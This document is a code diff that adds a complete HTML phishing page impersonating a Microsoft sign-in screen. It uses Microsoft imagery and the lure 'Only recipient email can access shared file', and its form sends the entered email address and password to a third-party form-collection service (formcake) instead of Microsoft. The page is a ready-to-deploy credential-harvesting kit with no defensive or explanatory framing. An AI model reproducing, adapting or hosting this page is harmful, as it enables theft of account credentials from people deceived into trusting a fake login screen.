@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	
+	<script type="text/javascript"></script>
+	<link href="https://fonts.googleapis.com/css2?family=Nunito:ital,wght@0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+	<link rel="icon" type="image/x-icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJbSJIAAAAe1BMVEX0QzZMr1AhlvP/wQf/////vgD0Nia63LtAq0Ww0vkAkfP/4636uLRJrk3/+Pj6saz2bWT1TEBVs1l0v3e027X4/Pn8zsv0PzLQ6NEsm/T/xBVWrPX/zUim0Pr/4qD3+//H4vz/7cPzJg8zqDj94N7h7+Hd6/z/8tsAjPI036d3AAABpElEQVR4nO3cSU5CURBA0fr4aBVFAcWGxt79r1CIEzFx+Ovlk3M3UDmppIYVpZTLq9l1tN3govxuOGra7ma+WO4nRSm3MbhrHVhB2ExHzeogvM3wVREejKsSl5ECrCNsps0yrgYpwErCZrSIWc4Kawmn82j/ilYVNjdJvnrChpCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQ8F/hIKmXP8LXUVJxkdXbkfB9mFWUU4+w+xF2P8LuR9j9CLsfYfeLcVYfR3M/z7OKSVJf4yPheT+r6CU1+Ss8S4qQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkPBf4f2JCx/i8cSFT7GenLSwv4ltDrDaDpdRdjlLrCPsPx8+lu96GcYawv7Z889P9u36sf2Lmi98eNos95O+AYpCk2OCi44MAAAAAElFTkSuQmCC">
+	<style>
+		
+
+		*{
+	margin: 0;
+	padding: 0;
+		font-family: 'Nunito', sans-serif;
+
+}
+
+
+body {
+	
+	background: url(https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8148.16/content/images/backgrounds/0.jpg);
+	background-position: center;
+	background-size: cover;
+}
+
+.container {
+	width: 350px;
+	height: 350px;
+	margin: 8% auto;
+	border-radius: 5px;
+	position: relative;
+	background: white;
+	padding: 50px;
+	justify-content: space-between;
+	overflow: hidden;
+	transition: 0.5sec;
+  /*margin-top: 5px;*/
+
+
+}
+.container-2 {
+  width: 450px;
+  height: 100px;
+  background: white;
+  margin-top: 10px;
+}
+
+.container form {
+	width: 280px;
+	position: absolute;
+	top: 5px;
+	left: 50px;
+	right: 10px;
+}
+
+.container a {
+	position: relative;
+	font-size: 13px;
+}
+
+/*.flex {
+  	height: 50px;
+  	width: 360px;
+  	background-color: white;
+  	margin-top: -125px;
+margin-left: 589px;
+  	margin-top: 100px;*/
+  }
+   .ig {
+  	height: 50px;
+  	width: 100px;
+}
+
+.micro {
+	height: 90px;
+	width: 150px;
+	padding: 5px;
+	padding-left: 5px;
+
+}
+
+.email-input{
+
+	height: 50px;
+	width: 350px;
+	border-radius: 5px solid black;
+	border-right: none;
+	border-top: none;
+	border-left: none;
+	outline: 0;
+  background: #e8f0fe;
+  font-size: 14px;
+}
+.btn-form {
+	align-content: right;
+}
+.btn-2 {
+  align-items: center;
+  background-color: blue;
+  border: 2px solid blue;
+  box-sizing: border-box;
+  color: #fff;
+  cursor: pointer;
+  display: inline-flex;
+  fill: #000;
+  font-family: Inter,sans-serif;
+  font-size: 16px;
+  font-weight: 600;
+  height: 40px;
+  justify-content: center;
+  letter-spacing: -.8px;
+  line-height: 24px;
+  min-width: 50px;
+  outline: 0;
+  padding: 0 17px;
+  text-align: center;
+  text-decoration: none;
+  transition: all .3s;
+  user-select: none;
+  -webkit-user-select: none;
+  touch-action: manipulation;
+  width: 100px;
+  margin-left: 250px;
+  text-align: right;
+  }
+
+.btn-2:focus {
+  color: #171e29;
+}
+
+.btn-2:hover {
+  background-color: #3385ff;
+  border-color: #3385ff;
+  fill: #06f;
+}
+.btn-2:active {
+  background-color: #3385ff;
+  border-color: #3385ff;
+  fill: #06f;
+}
+
+
+
+
+  .btn-1 {
+  align-items: center;
+  background-color: gray;
+  border: 2px solid grey;
+  box-sizing: border-box;
+  color: #fff;
+  cursor: pointer;
+  display: inline-flex;
+  fill: #000;
+  font-family: Inter,sans-serif;
+  font-size: 16px;
+  font-weight: 600;
+  height: 40px;
+  justify-content: center;
+  letter-spacing: -.8px;
+  line-height: 24px;
+  min-width: 50px;
+  outline: 0;
+  padding: 0 17px;
+  text-align: center;
+  text-decoration: none;
+  transition: all .3s;
+  user-select: none;
+  -webkit-user-select: none;
+  touch-action: manipulation;
+  width: 100px;
+  margin-right: 0 50px;
+  text-align: right;
+}
+
+.btn-1:focus {
+  color: #171e29;
+}
+
+.btn-1:hover {
+  background-color: #3385ff;
+  border-color: #3385ff;
+  fill: #06f;
+}
+.btn-1:active {
+  background-color: #3385ff;
+  border-color: #3385ff;
+  fill: #06f;
+}
+#btn-form {
+ text-align: right;
+ margin-right: -68px;
+ margin-top: 40px;
+
+
+}
+
+p {
+	margin-top: 20px;
+	font-size: 13px;
+}
+#form2 {
+	left: 500px;
+}
+
+.btn-3{
+	 align-items: center;
+  background-color: blue;
+  border: 2px solid blue;
+  box-sizing: border-box;
+  color: #fff;
+  cursor: pointer;
+  display: inline-flex;
+  fill: #000;
+  font-family: Inter,sans-serif;
+  font-size: 16px;
+  font-weight: 600;
+  height: 40px;
+  justify-content: center;
+  letter-spacing: -.8px;
+  line-height: 24px;
+  min-width: 50px;
+  outline: 0;
+  padding: 0 17px;
+  text-align: center;
+  text-decoration: none;
+  transition: all .3s;
+  user-select: none;
+  -webkit-user-select: none;
+  touch-action: manipulation;
+  width: 100px;
+  margin-right: 0 50px;
+  text-align: right;
+  }
+
+.btn-3:focus {
+  color: #171e29;
+}
+
+.btn-3:hover {
+  background-color: #3385ff;
+  border-color: #3385ff;
+  fill: #06f;
+}
+.btn-3:active {
+  background-color: #3385ff;
+  border-color: #3385ff;
+  fill: #06f;
+}
+
+#btn-form-2 {
+ text-align: right;
+ margin-right: 198px;
+ margin-top: 40px;
+}
+	</style>
+
+	<title>Document</title>
+</head>
+<body>
+
+	<center><img style="margin-top: 10px; height: 40px;" src="https://aadcdn.msftauth.net/shared/1.0/content/images/applogos/53_8b36337037cff88c3df203bb73d58e41.png"></center>
+	<div class="container">
+		
+		
+			 <form id="form1" action="https://api.formcake.com/api/form/808cdfaf-9f60-4293-aa79-9f7947583cb5/submission" method="POST">
+			 	<img class="micro" src="https://th.bing.com/th/id/OIP.uHrDUCEbFVxRTdSSRjC5_gHaCu?w=312&h=128&c=7&r=0&o=5&dpr=1.25&pid=1.7">
+			 	<h1>Sign in</h1>
+			 	<p>Only recipient email can access shared file</p>
+			 	<input class="email-input" type="text" name="Email" placeholder="Enter Email address" required>
+			 	<p></p>
+			 	<input class="email-input" type="password" name="password" placeholder="Enter password" required>
+
+			 				 	<a href="">Forgot My Password?</a>
+								  <p></p>
+
+			 	<button class="btn-2" type="submit" id="Row">Sign in</button>
+			 	
+
+
+			 	</div>
+
+
+			 	</div>
+
+
+
+			 </form>
+			 
+
+
+			  
+
+</body>
+</html>
